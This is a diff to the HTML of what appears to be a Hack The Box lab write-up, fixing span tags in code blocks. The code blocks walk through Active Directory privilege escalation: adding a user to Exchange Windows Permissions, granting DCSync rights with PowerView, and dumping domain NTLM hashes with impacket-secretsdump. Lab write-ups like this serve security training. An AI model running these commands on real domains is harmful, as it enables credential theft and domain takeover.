@@ -195,7 +195,7 @@ Mode                LastWriteTime         Length Name
 The command completed successfully.
 </code></pre></div><p>Next, we add this new user to <code>Exchange Windows Permissions</code> group:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">*Evil-WinRM*</span><span class="code-yellow"> PS </span>C:\Windows\Temp\privesc&gt; net group "Exchange Windows Permissions" rocky /add  
 The command completed successfully.
-</code></pre></div><p>Now that we have a valid user belonging to <code>Exchange Windows Permissions</code> group, we have the permissions to modify the DACL (Directory Access Control List) of the <code>htb.local</code> domain (shown in BloodHound as <code>WriteDacl</code>). Basically, we can grant any privilege we want to the new user <code>rocky</code>. BloodHound provides a list of commands to execute this task (we need to download <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"><code>PowerView.ps1</code></a> to the machine):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">*Evil-WinRM*<span class="code-yellow"> PS </span>C:\Windows\Temp\privesc&gt; upload PowerView.ps1
+</code></pre></div><p>Now that we have a valid user belonging to <code>Exchange Windows Permissions</code> group, we have the permissions to modify the DACL (Directory Access Control List) of the <code>htb.local</code> domain (shown in BloodHound as <code>WriteDacl</code>). Basically, we can grant any privilege we want to the new user <code>rocky</code>. BloodHound provides a list of commands to execute this task (we need to download <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"><code>PowerView.ps1</code></a> to the machine):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">*Evil-WinRM*</span><span class="code-yellow"> PS </span>C:\Windows\Temp\privesc&gt; upload PowerView.ps1
 <span class="code-dark-blue">Info: Uploading PowerView.ps1 to C:\Windows\Temp\privesc\PowerView.ps1</span>
 
 
@@ -203,10 +203,10 @@ The command completed successfully.
 
 <span class="code-dark-blue">Info: Upload successful!</span>
 
-<span class="code-dark-red">*Evil-WinRM*<span class="code-yellow"> PS </span>C:\Windows\Temp\privesc&gt; Import-Module .\PowerView.ps1
-<span class="code-dark-red">*Evil-WinRM*<span class="code-yellow"> PS </span>C:\Windows\Temp\privesc&gt; $SecPassword = ConvertTo-SecureString '7rocky7rocky' -AsPlainText -Force
-<span class="code-dark-red">*Evil-WinRM*<span class="code-yellow"> PS </span>C:\Windows\Temp\privesc&gt; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\rocky', $SecPassword)
-<span class="code-dark-red">*Evil-WinRM*<span class="code-yellow"> PS </span>C:\Windows\Temp\privesc&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity rocky -Rights DCSync  
+<span class="code-dark-red">*Evil-WinRM*</span><span class="code-yellow"> PS </span>C:\Windows\Temp\privesc&gt; Import-Module .\PowerView.ps1
+<span class="code-dark-red">*Evil-WinRM*</span><span class="code-yellow"> PS </span>C:\Windows\Temp\privesc&gt; $SecPassword = ConvertTo-SecureString '7rocky7rocky' -AsPlainText -Force
+<span class="code-dark-red">*Evil-WinRM*</span><span class="code-yellow"> PS </span>C:\Windows\Temp\privesc&gt; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\rocky', $SecPassword)
+<span class="code-dark-red">*Evil-WinRM*</span><span class="code-yellow"> PS </span>C:\Windows\Temp\privesc&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity rocky -Rights DCSync  
 </code></pre></div><p>Now, we are able to perform a DCSync attack with Mimikatz or Impacket <code>impacket-secretsdump</code> to extract all the NTLM hashes of the domain users (stored in the <code>NTDS.dit</code> file).</p><p>Using <code>impacket-secretsdump</code>, we can obtain the NTLM hash of <code>Administrator</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">impacket-secretsdump</span> htb.local/rocky:7rocky7rocky@10.10.10.161
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
